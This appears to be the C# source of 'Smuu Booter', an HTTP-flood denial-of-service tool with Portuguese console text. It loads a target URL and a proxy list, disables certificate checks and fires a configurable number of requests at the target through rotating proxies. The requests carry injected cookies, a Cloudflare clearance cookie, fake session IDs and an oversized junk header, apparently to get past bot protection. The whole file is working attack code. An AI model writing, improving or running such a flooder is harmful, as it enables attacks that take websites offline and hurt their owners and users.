using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace Booter
{
    public class Program
    {
        public static List<Http> _http = new List<Http>();
        private static int packet = 0;
        private static bool proxy = false;
        private static string cookie = "";
        public static string cf_clearance = "";
        private static string domain = "";
        private static string url = "";
        public static string useragent = null;
        private static string path = "/";
        private static int _httpIndex;
        public Dictionary<string, string> data;

        public static void Main(string[] args)
        {
            Console.Title = "Smuu Booter";
            Initialize();
            Console.Read();
        }

        public static Http GetHttp()
        {
            if (_httpIndex == _http.Count)
                _httpIndex = 0;
            Http http = _http[_httpIndex];
            ++_httpIndex;
            return http;
        }

        public static void Initialize()
        {
            ConfigIni();
            Console.Clear();
            Proxy();
            Init();
        }

        public static void ConfigIni()
        {
            try
            {
                var config = new ArquivoINI("config.ini");
                if (File.Exists("config.ini"))
                {
                    proxy = Convert.ToBoolean(config.Ler("proxy", "Config"));
                    packet = Convert.ToInt32(config.Ler("pacotes", "Config"));
                    url = config.Ler("url", "Config");
                    domain = url.Split('/')[2];

                    useragent = config.Ler("useragent", "Injetar");
                    cookie = config.Ler("cookie", "Injetar");
                }

                else
                {
                    config.Escrever("proxy", "true", "Config");
                    config.Escrever("pacotes", "1000", "Config");
                    config.Escrever("url", "https://google.com/", "Config");

                    config.Escrever("cookie", "valor1;nome2=valor2;nome3=valor3", "Injetar");
                    config.Escrever("useragent", "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36", "Injetar");
                }

            }
            catch (Exception e)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.Write("\r[Erro] ");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine(e.Message);
            }
        }

        private static void Proxy()
        {
            if (!File.Exists("proxy.txt")) File.Create("proxy.txt").Dispose();
            foreach (string readAllLine in File.ReadAllLines("proxy.txt"))
            {
                string line = readAllLine;
                if (line != "" && line.Contains(':') && _http.Find((p => p._ip == line.Split(':')[0])) == null)
                    _http.Add(new Http(line.Split(':')[0], int.Parse(line.Split(':')[1])));
            }

            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.Write("[Proxy] ");
            Console.ForegroundColor = ConsoleColor.DarkCyan;
            Console.WriteLine($"{_http.Count} registradas.");
        }

        public static string SessionID(int x)
        {
            Random rdm = new Random();
            return string.Concat(Enumerable.Range(0, x).Select(_ => rdm.Next(16).ToString("X")));
        }

        private static bool IsUrlValid(string webUrl)
        {
            if (webUrl == null) return false;
            return Regex.IsMatch(webUrl, @"(http|https)://(([www\.])?|([\da-z-\.]+))\.([a-z\.]{2,3})$");
        }
        private static void Init()
        {
            Http http = _http[new Random().Next(0, _http.Count)];
            if (proxy)
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("[Proxy] ");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine($"{ http._ip}:{ http._port}");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Write("[Proxy] ");
                Console.ForegroundColor = ConsoleColor.DarkCyan;
                Console.WriteLine("Desativada.");
            }

            for (int index = 0; index < packet; ++index)
            {
                try
                {
                    CookieContainer cookieContainer = new CookieContainer();
                    HttpClientHandler handler = new HttpClientHandler();
                    handler.ServerCertificateCustomValidationCallback = (message, cert, chain, errors) => { return true; };
                    handler.UseCookies = true;
                    handler.CookieContainer = cookieContainer;

                    if (proxy)
                    {
                        handler.Proxy = new WebProxy(http._ip, http._port);
                        handler.UseProxy = true;
                    }

                    HttpClient client = new HttpClient(handler, true);
                    client.DefaultRequestHeaders.Add("ContentType", "application/json");
                    client.DefaultRequestHeaders.TryAddWithoutValidation("################################################################################################################################", "################################################################################################################################");
                    client.DefaultRequestHeaders.Add("Cache-Control", "max-age=0");
                    client.DefaultRequestHeaders.Add("Accept", "application/json");
                    client.DefaultRequestHeaders.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3");
                    client.DefaultRequestHeaders.Add("Accept-Encoding", "gzip, deflate, br");
                    client.DefaultRequestHeaders.Add("Accept-Language", "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7");
                    client.DefaultRequestHeaders.Add("Upgrade-Insecure-Requests", "1");
                    client.DefaultRequestHeaders.Add("Referer", url);
                    client.DefaultRequestHeaders.Add("x-xss-protection", "1; mode=block");
                    client.DefaultRequestHeaders.Add("x-content-type-options", "nosniff");
                    client.DefaultRequestHeaders.Add("x-nginx-cache-statu", "BYPASS");
                    client.DefaultRequestHeaders.Add("x-server-powered-by", "Engintron");
                    client.DefaultRequestHeaders.Add("x-frame-options", "SAMEORIGIN");
                    client.DefaultRequestHeaders.Add("expect-ct", "max-age=604800, report-uri=\"https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct\"");
                    client.DefaultRequestHeaders.Add("expect-ct", "max-age=604800, report-uri=\"" + url + "/cdn-cgi/beacon/expect-ct\"");
                    client.DefaultRequestHeaders.Add("Connection", "keep-alive");
                    client.DefaultRequestHeaders.TryAddWithoutValidation("Content-Type", "application/x-www-form-urlencoded");
                    client.DefaultRequestHeaders.Add("X-Requested-With", "XMLHttpRequest");
                    client.DefaultRequestHeaders.TryAddWithoutValidation("User-Agent", useragent);


                    if (IsUrlValid(url))
                    {
                        client.DefaultRequestHeaders.Add("User-Agent", useragent);

                        string[] cookisall = cookie.Split(';');
                        foreach (string i in cookisall)
                        {
                            string[] cookie = i.Split('=');
                            if (cookie[0] != null)
                            {
                                var injectcook = new Cookie(cookie[0], cookie[1]);
                                injectcook.Domain = domain;
                                injectcook.Path = path;
                                injectcook.Secure = true;
                                injectcook.HttpOnly = true;
                                cookieContainer.Add(injectcook);
                            }
                        }

                        var newcookie = new Cookie("cf_clearance", cf_clearance);
                        newcookie.Domain = "." + domain;
                        newcookie.Path = "/";
                        newcookie.Secure = true;
                        newcookie.HttpOnly = true;
                        cookieContainer.Add(newcookie);

                        newcookie = new Cookie("PHPSESSID", SessionID(26));
                        newcookie.Domain = domain;
                        newcookie.Path = "/";
                        newcookie.Secure = true;
                        newcookie.HttpOnly = true;
                        cookieContainer.Add(newcookie);
                    }

                    new Client(client).Get(url);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                    break;
                }
            }

            string alvo = IsUrlValid(url) ? domain : url;
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.Write("\n[Alvo] ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine($"Apontando para {alvo}");

            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.Write("[Alvo] ");
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine($"Disparando com {packet} pacotes.");
            
        }

        public class Http
        {
            public string _ip;
            public int _port;

            public Http(string ip, int port)
            {
                _ip = ip;
                _port = port;
            }
        }
    }
}
